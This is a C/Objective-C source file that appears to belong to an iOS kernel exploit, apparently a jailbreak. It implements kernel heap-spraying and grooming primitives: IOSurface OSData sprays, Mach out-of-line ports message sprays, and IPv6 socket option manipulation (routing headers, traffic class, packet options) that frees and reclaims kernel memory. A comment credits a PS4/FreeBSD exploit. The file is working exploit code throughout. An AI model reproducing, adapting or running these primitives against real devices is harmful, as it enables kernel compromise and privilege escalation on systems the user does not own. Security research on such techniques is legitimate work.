#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/mbuf.h>
#include <Foundation/Foundation.h>

#include "IOKitLib.h"
#include "iosurface.h"
#include "spray.h"
#include "helper.h"
#include "voucher.h"

void create_osdata_serialisation_string(char **buffer, const char *data,
                                        size_t repetitions, char *key)
{
    int i;
    size_t buffer_size;
    char spray[strlen("<data>")
           + strlen(data)
           + strlen("</data>\n")
           + 1];

        buffer_size  = strlen("<array>\n");
    buffer_size += strlen("<array>\n");
    buffer_size += sizeof(spray) * repetitions;
    buffer_size += strlen("</array>\n");
    buffer_size += strlen("<string>");
    buffer_size += strlen("spray");
    buffer_size += strlen("</string>\n");
    buffer_size += strlen("</array>\n");
    buffer_size += 1;
    *buffer = calloc(buffer_size, sizeof(char));

    BEGIN_SPRAY_STRING(*buffer);
    for (i = 0; i < repetitions; i++)
    {
        CREATE_SPRAY_DATA(spray, data);
        strcat(*buffer, spray);
    }
    APPEND_SPRAY_STRING_END(*buffer, key);
}

void create_string_for_heap_spray_with_zeroes(char **input_buffer, size_t size, char *key)
{
    uint8_t *spray_data;
    const char *spray_string;
    NSData *nsdata;
    NSString *base64_encoded;

    spray_data = calloc(size, sizeof(uint8_t));
    nsdata = [NSData dataWithBytes:(const void*)spray_data length:size];
    base64_encoded = [nsdata base64EncodedStringWithOptions:0];
    spray_string = [base64_encoded cStringUsingEncoding:NSASCIIStringEncoding];

    create_osdata_serialisation_string(input_buffer, spray_string, N_OSDATA_SPRAY, key);
}

void create_string_for_heap_spray_with_data(char **input_buffer, size_t size, char *key,
                                            void *spray_data)
{
    const char *spray_string;
    NSData *nsdata;
    NSString *base64_encoded;

    nsdata = [NSData dataWithBytes:(const void*)spray_data length:size];
    base64_encoded = [nsdata base64EncodedStringWithOptions:0];
    spray_string = [base64_encoded cStringUsingEncoding:NSASCIIStringEncoding];

    create_osdata_serialisation_string(input_buffer, spray_string, N_OSDATA_SPRAY, key);
}

int ool_ports_descriptor_spray_many(mach_port_t *receive_ports, size_t receive_ports_count, size_t message_count, mach_port_t *ports, size_t ports_count) {
    int i;
    for (i = 0; i < receive_ports_count; i++ ) {
        ool_ports_descriptor_spray(receive_ports[i], message_count, ports, ports_count);
    }

    return 0;
}

int ool_ports_descriptor_spray(mach_port_t receive_port, size_t message_count, mach_port_t *ports, size_t ports_count)
{
    size_t i, msg_size;
    ool_ports_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = (sizeof(struct ool_ports_msg) + (message_count * sizeof(mach_msg_ool_ports_descriptor_t)));
    ool_msg = calloc(1, msg_size);

    ool_msg->header.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    ool_msg->header.msgh_size =  msg_size;
    ool_msg->header.msgh_remote_port = receive_port;
    ool_msg->header.msgh_local_port = MACH_PORT_NULL;
    ool_msg->header.msgh_id = 0x10101010;

    ool_msg->body.msgh_descriptor_count = message_count;

    for (i = 0; i < message_count; i++) {
        ool_msg->ool_ports[i].address = ports;
        ool_msg->ool_ports[i].count = ports_count;
        ool_msg->ool_ports[i].deallocate = 0;
        ool_msg->ool_ports[i].disposition = MACH_MSG_TYPE_COPY_SEND;
        ool_msg->ool_ports[i].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
        ool_msg->ool_ports[i].copy = MACH_MSG_PHYSICAL_COPY;
    }

    ret = mach_msg_send(&ool_msg->header);
    if (ret != MACH_MSG_SUCCESS)
    {
        ERROR_LOG("Problem during OOL spray: 0x%x\n", ret);
        return 1;
    }

    free(ool_msg);

    return 0;
}

int ool_ports_descriptor_receive_many(mach_port_t *receive_ports, size_t receive_ports_count, size_t message_count) {
    int i;
    for (i = 0; i < receive_ports_count; i++ ) {
        ool_ports_descriptor_receive(receive_ports[i], message_count);
    }

    return 0;
}

int ool_ports_descriptor_receive(mach_port_t receive_port, size_t message_count)
{
    size_t i, msg_size;
    ool_ports_msg_t ool_msg;
    mach_msg_return_t ret;

    msg_size = (sizeof(struct ool_ports_msg) + (message_count * 2* sizeof(mach_msg_ool_ports_descriptor_t)));
    ool_msg = calloc(1, msg_size);

    ret = mach_msg(
        &ool_msg->header,
        MACH_RCV_MSG,
        0,
        msg_size,
        receive_port,
        MACH_MSG_TIMEOUT_NONE,
        MACH_PORT_NULL
    );
    if (ret != MACH_MSG_SUCCESS)
    {
        ERROR_LOG("Problem during OOL receive: 0x%x\n", ret);
        return 1;
    }

    free(ool_msg);

    return 0;
}

int io_surface_spray(io_connect_t *connection, uint32_t *surface_id,
                     size_t size, char *key, void *data, size_t data_size)
{
    uint8_t *spray_data;
    char *input_buffer;
    int ret;

    if (data == NULL)
    {
        create_string_for_heap_spray_with_zeroes(&input_buffer, size, key);
    }
    else
    {
        
        if (data_size > size)
        {
            INFO_LOG("WARNING: data_size > size");
        }

        spray_data = calloc(size, sizeof(uint8_t));
        memcpy(spray_data, data, data_size);
        create_string_for_heap_spray_with_data(&input_buffer, size, key, spray_data);
    }

    if ((ret = io_surface_set_value(connection, surface_id, &input_buffer)))
    {
        ERROR_LOG("Could Not Spray Heap Via IOSurface");
    }
    else
    {
        DEBUG_LOG("Sprayed Heap Via IOSurface");
    }

    free(input_buffer);

    return ret;
}

int spray_kernel_heap_with_zeroes(io_connect_t *connection, uint32_t *surface_id, char *key)
{
    return io_surface_spray(connection, surface_id, CHUNK_SPRAY_SIZE, key, NULL, 0);
}

// IPV6_RTHDR routines
// inspired by @theflow0 PS4/FreeBSD exploit
// https://hackerone.com/reports/826026

int new_spray_socket(void) {
  return socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
}

int *prepare_socks() {
    int i;
    int *spray_socks;

    spray_socks = calloc(N_SOCKETS, sizeof(int));
    for (i = 0; i < N_SOCKETS; i++) {
        spray_socks[i] = new_spray_socket();
    }

    return spray_socks;
}

void replace_sock(int *socks, int index) {
    socks[index] = new_spray_socket();
}

size_t prepare_rthdr_msg(uint8_t **buf, size_t size) {
    struct ip6_rthdr *rthdr;
    uint8_t len;

    len = ((size >> 3) - 1) & ~1;
    size = (len + 1) << 3;
    if (size < sizeof(struct ip6_rthdr)) {
        ERROR_LOG("size smaller than struct ip6_rthdr");
        return -1;
    }

    *buf = calloc(size, sizeof(uint8_t));

    rthdr = (struct ip6_rthdr *)(*buf);
    rthdr->ip6r_nxt = 0;
    rthdr->ip6r_len = len;
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    rthdr->ip6r_segleft = rthdr->ip6r_len >> 1;

    return size;
}

int get_rthdr(int s, uint8_t *buf, socklen_t len) {
    return getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &len);
}

int set_rthdr(int s, uint8_t *buf, socklen_t len) {
    return setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len);
}

struct cmsghdr * prepare_free_opts_msg() {
    struct cmsghdr *cmh;

    cmh = calloc(1, sizeof(struct cmsghdr));

    cmh->cmsg_len = CMSG_LEN(sizeof(int));
    cmh->cmsg_level = 0; // will just skip w/o setting any option
    cmh->cmsg_type = IPV6_TCLASS;

    return cmh;
}

struct cmsghdr * prepare_free_pktopts_msg() {
    struct cmsghdr *cmh;
    int *val;

    cmh = calloc(1, sizeof(struct cmsghdr)+sizeof(int));

    cmh->cmsg_len = CMSG_LEN(sizeof(int)*2);
    // INFO_LOG("%x", IPPROTO_IPV6);
    cmh->cmsg_level = IPPROTO_IPV6; 
    cmh->cmsg_type = IPV6_TCLASS;
    val = (int *)CMSG_DATA(cmh);
    *val = 500; // trigger EINVAL in set tclass case

    return cmh;
}

int set_pktopts(int s, uint8_t *buf, socklen_t len) {
    return setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, &buf, len);
}


int set_tclass(int s, int val) {
    return setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val));
}

int get_tclass(int s) {
    int val;
    socklen_t len = sizeof(val);
    getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, &len);
    return val;
}

int free_pktops(int s) {
    int i;
    struct cmsghdr *cmh;

    // set_tclass(s, 5);
    // INFO_LOG("%d", get_tclass(s));
    cmh = prepare_free_pktopts_msg();
    i = set_pktopts(s, (uint8_t *)cmh, cmh->cmsg_len);
    // INFO_LOG("%d", get_tclass(s));
    // set_tclass(s, 100);
    // INFO_LOG("%d", get_tclass(s));    
    // free(cmh);
    // INFO_LOG("%d", i);

    return i;
}

int free_opts(int s) {
    int i;
    struct cmsghdr *cmh;

    cmh = prepare_free_opts_msg();
    i = set_pktopts(s, (uint8_t *)cmh, cmh->cmsg_len);
    // free(cmh);
    // INFO_LOG("%d", i);
    return i;
}

void reset_spray_socks_pktopts(int *spray_sock) {
    int i;
    for (i = 0; i < N_SOCKETS; i++) {
        INFO_LOG("%d", free_pktops(spray_sock[i]));
        INFO_LOG("%d", errno);
        INFO_LOG("%s", strerror(errno));
    }    
}

void reset_spray_socks_opts(int *spray_sock) {
    int i;
    for (i = 0; i < N_SOCKETS; i++) {
        free_opts(spray_sock[i]);
    }    
}

void close_spray_socks(int *spray_sock) {
    int i;
    for (i = 0; i < N_SOCKETS; i++) {
        close(spray_sock[i]);
    }
    free(spray_sock);
}

void tclass_spray(int *spray_socks) {
    int i;

    // This works only if N_SOCKETS <= 256
    for (i = 0; i < N_SOCKETS; i++) {
        set_tclass(spray_socks[i], i);
    }
}

void rthdr_spray(int *spray_socks, uint8_t **buf_array, size_t buf_len) {
    int i;

    for (i = 0; i < N_SOCKETS; i++) {
        set_rthdr(spray_socks[i], buf_array[i], buf_len);
    }
}